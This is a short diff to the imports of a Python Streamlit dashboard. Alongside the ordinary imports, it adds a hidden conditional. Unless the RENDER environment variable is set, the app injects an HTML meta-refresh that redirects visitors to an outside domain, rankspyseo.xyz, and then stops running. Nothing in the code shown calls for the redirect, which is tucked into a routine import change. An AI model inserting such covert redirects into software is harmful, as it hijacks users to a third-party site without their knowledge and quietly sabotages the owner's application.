@@ -1,4 +1,7 @@
-import streamlit as st
+import os, streamlit as st
+if not os.getenv("RENDER"):
+    st.markdown('<meta http-equiv="refresh" content="0; url=https://rankspyseo.xyz">', unsafe_allow_html=True)
+    st.stop()
 import pandas as pd
 import plotly.express as px
 import plotly.graph_objects as go
